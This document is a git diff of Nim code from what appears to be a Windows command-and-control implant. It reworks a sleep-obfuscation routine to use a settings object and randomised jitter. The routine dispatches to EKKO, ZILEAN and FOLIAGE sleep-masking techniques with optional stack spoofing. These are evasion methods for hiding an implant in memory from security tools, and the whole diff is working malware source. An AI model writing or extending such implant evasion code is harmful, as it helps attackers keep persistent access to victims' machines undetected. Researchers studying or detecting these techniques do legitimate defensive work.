@@ -1,6 +1,6 @@
 import winim/lean
 import winim/inc/tlhelp32
-import os, system, strformat
+import os, system, strformat, random
 
 import ./[cfg, io] 
 import ../../common/[types, utils, crypto]
@@ -572,15 +572,21 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         print "[-] ", err.msg
 
 # Sleep obfuscation implemented in various techniques
-proc sleepObfuscate*(sleepDelay: int, technique: SleepObfuscationTechnique = NONE, spoofStack: var bool = true) = 
+proc sleepObfuscate*(sleepSettings: SleepSettings) = 
     
-    if sleepDelay == 0: 
+    if sleepSettings.sleepDelay == 0: 
         return 
     
     # Initialize required API functions 
     let apis = initApis() 
 
-    print fmt"[*] Sleepmask settings: Technique: {$technique}, Delay: {$sleepDelay}ms, Stack spoofing: {$spoofStack}"
+    # Calculate actual sleep delay with jitter
+    let 
+        minDelay = float(sleepSettings.sleepDelay) - (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
+        maxDelay = float(sleepSettings.sleepDelay) + (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
+        delay = int(rand(minDelay .. maxDelay) * 1000)
+
+    print fmt"[*] Sleepmask settings: Technique: {$sleepSettings.sleepTechnique}, Delay: {$delay}ms, Stack spoofing: {$sleepSettings.spoofStack}"
 
     var img: USTRING = USTRING(Length: 0)
     var key: USTRING = USTRING(Length: 0)
@@ -600,12 +606,12 @@ proc sleepObfuscate*(sleepDelay: int, technique: SleepObfuscationTechnique = NON
     key.Length = cast[DWORD](keyBuffer.len())
 
     # Execute sleep obfuscation technique
-    case technique:
+    case sleepSettings.sleepTechnique:
     of EKKO: 
-        sleepEkko(apis, key, img, sleepDelay, spoofStack)
+        sleepEkko(apis, key, img, delay, sleepSettings.spoofStack)
     of ZILEAN: 
-        sleepZilean(apis, key, img, sleepDelay, spoofStack)
+        sleepZilean(apis, key, img, delay, sleepSettings.spoofStack)
     of FOLIAGE:
-        sleepFoliage(apis, key, img, sleepDelay)
+        sleepFoliage(apis, key, img, delay)
     of NONE:
-        sleep(sleepDelay)
+        sleep(delay)
